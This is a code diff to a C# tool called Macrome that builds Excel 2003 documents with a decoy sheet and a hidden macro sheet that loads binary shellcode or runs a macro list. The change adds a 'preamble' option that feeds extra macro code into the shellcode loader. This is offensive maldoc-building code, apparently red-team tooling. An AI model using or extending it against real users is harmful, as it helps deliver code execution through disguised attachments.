@@ -94,11 +94,12 @@ namespace Macrome
         /// <param name="decoyDocument">File path to the base Excel 2003 sheet that should be visible to users.</param>
         /// <param name="payload">Either binary shellcode or a newline separated list of Excel Macros to execute</param>
         /// <param name="payloadType">Specify if the payload is binary shellcode or a macro list. Defaults to Shellcode</param>
+        /// <param name="preamble">Preamble macro code to include with binary shellcode payload type</param>
         /// <param name="macroSheetName">The name that should be used for the macro sheet. Defaults to Sheet2</param>
         /// <param name="outputFileName">The output filename used for the generated document. Defaults to output.xls</param>
         /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
-        public static void Build(FileInfo decoyDocument, FileInfo payload,
-            PayloadType payloadType = PayloadType.Shellcode,
+        public static void Build(FileInfo decoyDocument, FileInfo payload, string preamble,
+            PayloadType payloadType = PayloadType.Shellcode, 
             string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false)
         {
             if (decoyDocument == null || payload == null)
@@ -123,6 +124,12 @@ namespace Macrome
             string decoyDocPath = decoyDocument.FullName;
 
             WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
+            List<string> preambleCode = new List<string>();
+            if (preamble != null)
+            {
+                string preambleCodePath = new FileInfo(preamble).FullName;
+                preambleCode = new List<string>(File.ReadAllLines(preambleCodePath));
+            }
 
             if (wbs.GetAllRecordsByType<SupBook>().Count > 0)
             {
@@ -141,7 +148,7 @@ namespace Macrome
             switch (payloadType)
             {
                 case PayloadType.Shellcode:
-                    macros = MacroPatterns.GetBinaryLoaderPattern(macroSheetName);
+                    macros = MacroPatterns.GetBinaryLoaderPattern(preambleCode, macroSheetName);
                     binaryPayload = File.ReadAllBytes(payload.FullName);
                     break;
                 case PayloadType.Macro:
